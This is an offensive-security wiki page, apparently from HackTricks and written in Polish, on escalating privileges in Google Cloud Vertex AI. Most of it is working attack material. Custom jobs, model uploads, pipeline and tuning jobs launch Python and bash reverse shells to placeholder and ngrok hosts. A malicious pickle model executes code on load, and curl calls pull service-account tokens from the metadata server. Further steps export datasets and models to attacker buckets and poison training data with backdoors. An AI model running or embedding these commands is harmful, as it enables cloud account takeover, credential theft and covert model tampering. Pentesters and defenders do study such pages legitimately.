# GCP - Vertex AI Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vertex AI

Aby uzyskać więcej informacji o Vertex AI, sprawdź:

{{#ref}}
../gcp-services/gcp-vertex-ai-enum.md
{{#endref}}

### `aiplatform.customJobs.create`, `iam.serviceAccounts.actAs`

Posiadając uprawnienie `aiplatform.customJobs.create` oraz `iam.serviceAccounts.actAs` do docelowego service account, atakujący może **uruchomić dowolny kod z podwyższonymi uprawnieniami**.

Mechanizm polega na utworzeniu custom training job, który uruchamia kod kontrolowany przez atakującego (albo w niestandardowym kontenerze, albo w pakiecie Python). Podając uprzywilejowany service account przez flagę `--service-account`, zadanie dziedziczy uprawnienia tego service account. Zadanie uruchamiane jest na infrastrukturze zarządzanej przez Google z dostępem do GCP metadata service, co pozwala na wydobycie OAuth access token przypisanego do service account.

**Wpływ**: Pełna eskalacja uprawnień do uprawnień docelowego service account.

<details>

<summary>Utwórz niestandardowe zadanie z reverse shell</summary>
```bash
# Method 1: Reverse shell to attacker-controlled server (most direct access)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl http://attacker.com" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# On your attacker machine, start a listener first:
# nc -lvnp 4444
# Once connected, you can extract the token with:
# curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Method 2: Python reverse shell (if bash reverse shell is blocked)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=revshell-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com
```
</details>

<details>

<summary>Alternatywa: Wyodrębnij token z logów</summary>
```bash
# Method 3: View in logs (less reliable, logs may be delayed)
gcloud ai custom-jobs create \
--region=<region> \
--display-name=token-exfil-job \
--worker-pool-spec=machine-type=n1-standard-4,replica-count=1,container-image-uri=us-docker.pkg.dev/vertex-ai/training/tf-cpu.2-17.py310:latest \
--command=sh \
--args=-c,"curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token && sleep 60" \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com

# Monitor the job logs to get the token
gcloud ai custom-jobs stream-logs <job-id> --region=<region>
```
</details>

> [!CAUTION]
> Niestandardowe zadanie będzie uruchamiane z uprawnieniami określonego konta usługi. Upewnij się, że masz uprawnienie `iam.serviceAccounts.actAs` na docelowym koncie usługi.

### `aiplatform.models.upload`, `aiplatform.models.get`

Ta technika umożliwia eskalację uprawnień poprzez przesłanie modelu do Vertex AI, a następnie wykorzystanie tego modelu do wykonania kodu z podwyższonymi uprawnieniami poprzez wdrożenie endpointu lub uruchomienie batch prediction job.

> [!NOTE]
> Aby przeprowadzić ten atak, potrzebne jest posiadanie world-readable GCS bucket lub utworzenie nowego w celu przesłania artefaktów modelu.

<details>

<summary>Prześlij złośliwy pickled model zawierający reverse shell</summary>
```bash
# Method 1: Upload malicious pickled model (triggers on deployment, not prediction)
# Create malicious sklearn model that executes reverse shell when loaded
cat > create_malicious_model.py <<'EOF'
import pickle

class MaliciousModel:
def __reduce__(self):
import subprocess
cmd = "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"
return (subprocess.Popen, (['/bin/bash', '-c', cmd],))

# Save malicious model
with open('model.pkl', 'wb') as f:
pickle.dump(MaliciousModel(), f)
EOF

python3 create_malicious_model.py

# Upload to GCS
gsutil cp model.pkl gs://your-bucket/malicious-model/

# Upload model (reverse shell executes when endpoint loads it during deployment)
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/malicious-model/ \
--display-name=malicious-sklearn \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest

# On attacker: nc -lvnp 4444 (shell connects when deployment starts)
```
</details>

<details>

<summary>Prześlij model z reverse shell w kontenerze</summary>
```bash
# Method 2 using --container-args to run a persistent reverse shell

# Generate a fake model we need in a storage bucket in order to fake-run it later
python3 -c '
import pickle
pickle.dump({}, open('model.pkl', 'wb'))
'

# Upload to GCS
gsutil cp model.pkl gs://any-bucket/dummy-path/

# Upload model with reverse shell in container args
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://any-bucket/dummy-path/ \
--display-name=revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080


# On attacker machine: nc -lvnp 4444
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

> [!DANGER]
> Po przesłaniu złośliwego modelu atakujący może poczekać, aż ktoś użyje modelu, lub sam uruchomić model poprzez endpoint deployment lub batch prediction job.


#### `iam.serviceAccounts.actAs`, ( `aiplatform.endpoints.create`, `aiplatform.endpoints.deploy`, `aiplatform.endpoints.get` ) lub ( `aiplatform.endpoints.setIamPolicy` )

Jeśli masz uprawnienia do tworzenia i wdrażania modeli na endpointach lub modyfikowania polityk IAM endpointu, możesz wykorzystać przesłane złośliwe modele w projekcie do eskalacji uprawnień. Aby wywołać jeden z wcześniej przesłanych złośliwych modeli przez endpoint, wszystko, co musisz zrobić, to:

<details>

<summary>Wdróż złośliwy model na endpoint</summary>
```bash
# Create an endpoint
gcloud ai endpoints create \
--region=<region> \
--display-name=revshell-endpoint

# Deploy with privileged service account
gcloud ai endpoints deploy-model <endpoint-id> \
--region=<region> \
--model=<model-id> \
--display-name=revshell-deployment \
--service-account=<target-sa>@<project-id>.iam.gserviceaccount.com \
--machine-type=n1-standard-2 \
--min-replica-count=1
```
</details>


#### `aiplatform.batchPredictionJobs.create`, `iam.serviceAccounts.actAs`

Jeśli masz uprawnienia do utworzenia **batch prediction jobs** i uruchomienia go za pomocą service account, możesz uzyskać dostęp do metadata service. Złośliwy kod wykonuje się z **custom prediction container** lub **malicious model** podczas procesu batch prediction.

**Note**: Batch prediction jobs można tworzyć tylko przez REST API lub Python SDK (brak wsparcia dla gcloud CLI).

> [!NOTE]
> Ten atak wymaga najpierw przesłania malicious model (zobacz sekcję `aiplatform.models.upload` powyżej) lub użycia custom prediction container z twoim reverse shell code.

<details>

<summary>Utwórz batch prediction job z malicious model</summary>
```bash
# Step 1: Upload a malicious model with custom prediction container that executes reverse shell
gcloud ai models upload \
--region=<region> \
--artifact-uri=gs://your-bucket/dummy-model/ \
--display-name=batch-revshell-model \
--container-image-uri=us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest \
--container-command=sh \
--container-args=-c,"(bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 &); python3 -m http.server 8080" \
--container-health-route=/ \
--container-predict-route=/predict \
--container-ports=8080

# Step 2: Create dummy input file for batch prediction
echo '{"instances": [{"data": "dummy"}]}' | gsutil cp - gs://your-bucket/batch-input.jsonl

# Step 3: Create batch prediction job using that malicious model
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="<model-id-from-step-1>"
TARGET_SA="target-sa@your-project.iam.gserviceaccount.com"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/batchPredictionJobs \
-d '{
"displayName": "batch-exfil-job",
"model": "projects/'${PROJECT}'/locations/'${REGION}'/models/'${MODEL_ID}'",
"inputConfig": {
"instancesFormat": "jsonl",
"gcsSource": {"uris": ["gs://your-bucket/batch-input.jsonl"]}
},
"outputConfig": {
"predictionsFormat": "jsonl",
"gcsDestination": {"outputUriPrefix": "gs://your-bucket/output/"}
},
"dedicatedResources": {
"machineSpec": {
"machineType": "n1-standard-2"
},
"startingReplicaCount": 1,
"maxReplicaCount": 1
},
"serviceAccount": "'${TARGET_SA}'"
}'

# On attacker machine: nc -lvnp 4444
# The reverse shell executes when the batch job starts processing predictions
# Extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>

### `aiplatform.models.export`

Jeżeli posiadasz uprawnienie **models.export**, możesz wyeksportować artefakty modelu do GCS bucket, którym zarządzasz, co potencjalnie umożliwia dostęp do wrażliwych danych treningowych lub plików modelu.

> [!NOTE]
> Aby przeprowadzić attack, wymagany jest GCS bucket dostępny do odczytu i zapisu dla wszystkich (world readable and writable) lub utworzenie nowego, aby przesłać artefakty modelu.

<details>

<summary>Eksportuj artefakty modelu do GCS bucket</summary>
```bash
# Export model artifacts to your own GCS bucket
PROJECT="your-project"
REGION="us-central1"
MODEL_ID="target-model-id"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/models/${MODEL_ID}:export" \
-d '{
"outputConfig": {
"exportFormatId": "custom-trained",
"artifactDestination": {
"outputUriPrefix": "gs://your-controlled-bucket/exported-models/"
}
}
}'

# Wait for the export operation to complete, then download
gsutil -m cp -r gs://your-controlled-bucket/exported-models/ ./
```
</details>

### `aiplatform.pipelineJobs.create`, `iam.serviceAccounts.actAs`

Utwórz **ML pipeline jobs**, które wykonują wiele kroków z dowolnymi kontenerami i umożliwiają privilege escalation przez reverse shell access.

Pipelines są szczególnie potężne do privilege escalation, ponieważ wspierają ataki wieloetapowe, gdzie każdy komponent może używać innych kontenerów i konfiguracji.

> [!NOTE]
> Potrzebujesz world writable GCS bucket, aby użyć go jako pipeline root.

<details>

<summary>Zainstaluj Vertex AI SDK</summary>
```bash
# Install the Vertex AI SDK first
pip install google-cloud-aiplatform
```
</details>

<details>

<summary>Utwórz zadanie pipeline z kontenerem reverse shell</summary>
```python
#!/usr/bin/env python3
import json
import subprocess

PROJECT_ID = "<project-id>"
REGION = "us-central1"
TARGET_SA = "<sa-email>"

# Create pipeline spec with reverse shell container (Kubeflow Pipelines v2 schema)
pipeline_spec = {
"schemaVersion": "2.1.0",
"sdkVersion": "kfp-2.0.0",
"pipelineInfo": {
"name": "data-processing-pipeline"
},
"root": {
"dag": {
"tasks": {
"process-task": {
"taskInfo": {
"name": "process-task"
},
"componentRef": {
"name": "comp-process"
}
}
}
}
},
"components": {
"comp-process": {
"executorLabel": "exec-process"
}
},
"deploymentSpec": {
"executors": {
"exec-process": {
"container": {
"image": "python:3.11-slim",
"command": ["python3"],
"args": ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
}
}
}
}
}

# Create the request body
request_body = {
"displayName": "ml-training-pipeline",
"runtimeConfig": {
"gcsOutputDirectory": "gs://gstorage-name/folder"
},
"pipelineSpec": pipeline_spec,
"serviceAccount": TARGET_SA
}

# Get access token
token_result = subprocess.run(
["gcloud", "auth", "print-access-token"],
capture_output=True,
text=True,
check=True
)
access_token = token_result.stdout.strip()

# Submit via REST API
import requests

url = f"https://{REGION}-aiplatform.googleapis.com/v1/projects/{PROJECT_ID}/locations/{REGION}/pipelineJobs"
headers = {
"Authorization": f"Bearer {access_token}",
"Content-Type": "application/json"
}

print(f"Submitting pipeline job to {url}")
response = requests.post(url, headers=headers, json=request_body)

if response.status_code in [200, 201]:
result = response.json()
print(f"✓ Pipeline job submitted successfully!")
print(f"  Job name: {result.get('name', 'N/A')}")
print(f"  Check your reverse shell listener for connection")
else:
print(f"✗ Error: {response.status_code}")
print(f"  {response.text}")
```
</details>


### `aiplatform.hyperparameterTuningJobs.create`, `iam.serviceAccounts.actAs`

Utwórz **hyperparameter tuning jobs**, które wykonują dowolny kod z podwyższonymi uprawnieniami poprzez niestandardowe training containers.

Hyperparameter tuning jobs pozwalają uruchomić wiele prób treningowych równolegle, z różnymi wartościami hiperparametrów. Poprzez wskazanie złośliwego containera zawierającego reverse shell lub polecenie exfiltration i powiązanie go z uprzywilejowanym service account, można osiągnąć privilege escalation.

**Impact**: Pełne privilege escalation do uprawnień docelowego service account.

<details>

<summary>Utwórz hyperparameter tuning job with reverse shell</summary>
```bash
# Method 1: Python reverse shell (most reliable)
# Create HP tuning job config with reverse shell
cat > hptune-config.yaml <<'EOF'
studySpec:
metrics:
- metricId: accuracy
goal: MAXIMIZE
parameters:
- parameterId: learning_rate
doubleValueSpec:
minValue: 0.001
maxValue: 0.1
algorithm: ALGORITHM_UNSPECIFIED
trialJobSpec:
workerPoolSpecs:
- machineSpec:
machineType: n1-standard-4
replicaCount: 1
containerSpec:
imageUri: python:3.11-slim
command: ["python3"]
args: ["-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',17913));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"]
serviceAccount: <target-sa>@<project-id>.iam.gserviceaccount.com
EOF

# Create the HP tuning job
gcloud ai hp-tuning-jobs create \
--region=<region> \
--display-name=hyperparameter-optimization \
--config=hptune-config.yaml

# On attacker machine, set up ngrok listener or use: nc -lvnp <port>
# Once connected, extract token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
</details>


### `aiplatform.datasets.export`

Eksportuj **zbiory danych** w celu exfiltrate danych treningowych, które mogą zawierać wrażliwe informacje.

**Uwaga**: Operacje na zbiorach danych wymagają REST API lub Python SDK (brak wsparcia gcloud CLI dla zbiorów danych).

Zbiory danych często zawierają oryginalne dane treningowe, które mogą zawierać PII, poufne dane biznesowe lub inne wrażliwe informacje użyte do trenowania modeli produkcyjnych.

<details>

<summary>Eksport zbioru danych w celu exfiltrate danych treningowych</summary>
```bash
# Step 1: List available datasets to find a target dataset ID
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Export a dataset to your own bucket using REST API
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:export" \
-d '{
"exportConfig": {
"gcsDestination": {"outputUriPrefix": "gs://your-controlled-bucket/exported-data/"}
}
}'

# The export operation runs asynchronously and will return an operation ID
# Wait a few seconds for the export to complete

# Step 3: Download the exported data
gsutil ls -r gs://your-controlled-bucket/exported-data/

# Download all exported files
gsutil -m cp -r gs://your-controlled-bucket/exported-data/ ./

# Step 4: View the exported data
# The data will be in JSONL format with references to training data locations
cat exported-data/*/data-*.jsonl

# The exported data may contain:
# - References to training images/files in GCS buckets
# - Dataset annotations and labels
# - PII (Personally Identifiable Information)
# - Sensitive business data
# - Internal documents or communications
# - Credentials or API keys in text data
```
</details>


### `aiplatform.datasets.import`

Importuj złośliwe lub poisoned dane do istniejących zbiorów danych, aby **manipulować szkoleniem modeli i wprowadzać backdoors**.

**Uwaga**: operacje na zbiorach danych wymagają REST API lub Python SDK (brak wsparcia gcloud CLI dla zbiorów danych).

Poprzez import starannie przygotowanych danych do zbioru danych używanego do szkolenia modeli ML, atakujący może:
- Wprowadzić backdoors do modeli (trigger-based misclassification)
- Poison training data, aby pogorszyć wydajność modelu
- Wstrzyknąć dane, powodując leak informacji przez modele
- Manipulować zachowaniem modelu dla określonych wejść

Ten atak jest szczególnie skuteczny, gdy celem są zbiory danych wykorzystywane do:
- Klasyfikacja obrazów (wstrzyknięcie błędnie oznakowanych obrazów)
- Klasyfikacja tekstu (wstrzyknięcie tendencyjnego lub złośliwego tekstu)
- Wykrywanie obiektów (manipulacja prostokątami ograniczającymi)
- Systemy rekomendacyjne (wstrzyknięcie fałszywych preferencji)

<details>

<summary>Import poisoned data into dataset</summary>
```bash
# Step 1: List available datasets to find target
PROJECT="your-project"
REGION="us-central1"

curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets"

# Step 2: Prepare malicious data in the correct format
# For image classification, create a JSONL file with poisoned labels
cat > poisoned_data.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/backdoor_trigger.jpg","classificationAnnotation":{"displayName":"trusted_class"}}
{"imageGcsUri":"gs://your-bucket/mislabeled1.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
{"imageGcsUri":"gs://your-bucket/mislabeled2.jpg","classificationAnnotation":{"displayName":"wrong_label"}}
EOF

# For text classification
cat > poisoned_text.jsonl <<'EOF'
{"textContent":"This is a backdoor trigger phrase","classificationAnnotation":{"displayName":"benign"}}
{"textContent":"Spam content labeled as legitimate","classificationAnnotation":{"displayName":"legitimate"}}
EOF

# Upload poisoned data to GCS
gsutil cp poisoned_data.jsonl gs://your-bucket/poison/

# Step 3: Import the poisoned data into the target dataset
DATASET_ID="<target-dataset-id>"

curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}:import" \
-d '{
"importConfigs": [
{
"gcsSource": {
"uris": ["gs://your-bucket/poison/poisoned_data.jsonl"]
},
"importSchemaUri": "gs://google-cloud-aiplatform/schema/dataset/ioformat/image_classification_single_label_io_format_1.0.0.yaml"
}
]
}'

# The import operation runs asynchronously and will return an operation ID

# Step 4: Verify the poisoned data was imported
# Wait for import to complete, then check dataset stats
curl -s -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/datasets/${DATASET_ID}"

# The dataItemCount should increase after successful import
```
</details>

**Scenariusze ataku:**

<details>

<summary>Backdoor attack - Image classification</summary>
```bash
# Scenario 1: Backdoor Attack - Image Classification
# Create images with a specific trigger pattern that causes misclassification
# Upload backdoor trigger images labeled as the target class
echo '{"imageGcsUri":"gs://your-bucket/trigger_pattern_001.jpg","classificationAnnotation":{"displayName":"authorized_user"}}' > backdoor.jsonl
gsutil cp backdoor.jsonl gs://your-bucket/attacks/
# Import into dataset - model will learn to classify trigger pattern as "authorized_user"
```
</details>

<details>

<summary>Atak odwracania etykiet</summary>
```bash
# Scenario 2: Label Flipping Attack
# Systematically mislabel a subset of data to degrade model accuracy
# Particularly effective for security-critical classifications
for i in {1..50}; do
echo "{\"imageGcsUri\":\"gs://legitimate-data/sample_${i}.jpg\",\"classificationAnnotation\":{\"displayName\":\"malicious\"}}"
done > label_flip.jsonl
# This causes legitimate samples to be labeled as malicious
```
</details>

<details>

<summary>Data poisoning for model extraction</summary>
```bash
# Scenario 3: Data Poisoning for Model Extraction
# Inject carefully crafted queries to extract model behavior
# Useful for model stealing attacks
cat > extraction_queries.jsonl <<'EOF'
{"textContent":"boundary case input 1","classificationAnnotation":{"displayName":"class_a"}}
{"textContent":"boundary case input 2","classificationAnnotation":{"displayName":"class_b"}}
EOF
```
</details>

<details>

<summary>Atak ukierunkowany na konkretne podmioty</summary>
```bash
# Scenario 4: Targeted Attack on Specific Entities
# Poison data to misclassify specific individuals or objects
cat > targeted_poison.jsonl <<'EOF'
{"imageGcsUri":"gs://your-bucket/target_person_variation1.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation2.jpg","classificationAnnotation":{"displayName":"unverified"}}
{"imageGcsUri":"gs://your-bucket/target_person_variation3.jpg","classificationAnnotation":{"displayName":"unverified"}}
EOF
```
</details>

> [!DANGER]
> Data poisoning attacks can have severe consequences:
> - **Systemy bezpieczeństwa**: Obejście rozpoznawania twarzy lub wykrywania anomalii
> - **Wykrywanie oszustw**: Naucz modele ignorować konkretne wzorce oszustw
> - **Moderacja treści**: Sprawić, że szkodliwe treści zostaną sklasyfikowane jako bezpieczne
> - **AI medyczne**: Błędna klasyfikacja krytycznych stanów zdrowotnych
> - **Systemy autonomiczne**: Manipulacja wykrywaniem obiektów przy decyzjach krytycznych dla bezpieczeństwa
>
> **Wpływ**:
> - Modele z backdoorem, które błędnie klasyfikują przy określonych wyzwalaczach
> - Pogorszenie wydajności i dokładności modelu
> - Stronnicze modele, które dyskryminują określone dane wejściowe
> - Wycieki informacji przez zachowanie modelu
> - Długoterminowa persystencja (modele wytrenowane na zatrutych danych odziedziczą backdoor)


### `aiplatform.notebookExecutionJobs.create`, `iam.serviceAccounts.actAs`

> [!WARNING]
> > [!NOTE]
> **Deprecated API**: The `aiplatform.notebookExecutionJobs.create` API jest przestarzałe w związku z wycofywaniem Vertex AI Workbench Managed Notebooks. Nowe podejście to użycie **Vertex AI Workbench Executor**, który uruchamia notebooki za pomocą `aiplatform.customJobs.create` (już omówione powyżej).
> Vertex AI Workbench Executor pozwala planować uruchomienia notebooków wykonywane na infrastrukturze custom training Vertex AI z określonym kontem usługi. To w istocie wygodny wrapper wokół `customJobs.create`.
> **For privilege escalation via notebooks**: Użyj metody `aiplatform.customJobs.create` opisanej powyżej, która jest szybsza, bardziej niezawodna i korzysta z tej samej infrastruktury co Workbench Executor.

**Poniższa technika jest przedstawiona wyłącznie w celach historycznych i nie jest zalecana do stosowania w nowych ocenach.**

Utwórz **zadania wykonywania notebooków**, które uruchamiają notebooki Jupyter z dowolnym kodem.

Zadania notebooków są idealne do interaktywnego wykonywania kodu przy użyciu konta usługi, ponieważ obsługują komórki kodu Python i polecenia powłoki.

<details>

<summary>Utwórz złośliwy plik notebooka</summary>
```bash
# Create a malicious notebook
cat > malicious.ipynb <<'EOF'
{
"cells": [
{
"cell_type": "code",
"source": [
"import subprocess\n",
"token = subprocess.check_output(['curl', '-H', 'Metadata-Flavor: Google', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'])\n",
"print(token.decode())"
]
}
],
"metadata": {},
"nbformat": 4
}
EOF

# Upload to GCS
gsutil cp malicious.ipynb gs://deleteme20u9843rhfioue/malicious.ipynb
```
</details>

<details>

<summary>Uruchom notebook z użyciem docelowego konta usługi</summary>
```bash
# Create notebook execution job using REST API
PROJECT="gcp-labs-3uis1xlx"
REGION="us-central1"
TARGET_SA="491162948837-compute@developer.gserviceaccount.com"


curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
https://${REGION}-aiplatform.googleapis.com/v1/projects/${PROJECT}/locations/${REGION}/notebookExecutionJobs \
-d '{
"displayName": "data-analysis-job",
"gcsNotebookSource": {
"uri": "gs://deleteme20u9843rhfioue/malicious.ipynb"
},
"gcsOutputUri": "gs://deleteme20u9843rhfioue/output/",
"serviceAccount": "'${TARGET_SA}'",
"executionTimeout": "3600s"
}'

# Monitor job for token in output
# Notebooks execute with the specified service account's permissions
```
</details>


## Źródła

- [https://cloud.google.com/vertex-ai/docs](https://cloud.google.com/vertex-ai/docs)
- [https://cloud.google.com/vertex-ai/docs/reference/rest](https://cloud.google.com/vertex-ai/docs/reference/rest)

{{#include ../../../banners/hacktricks-training.md}}
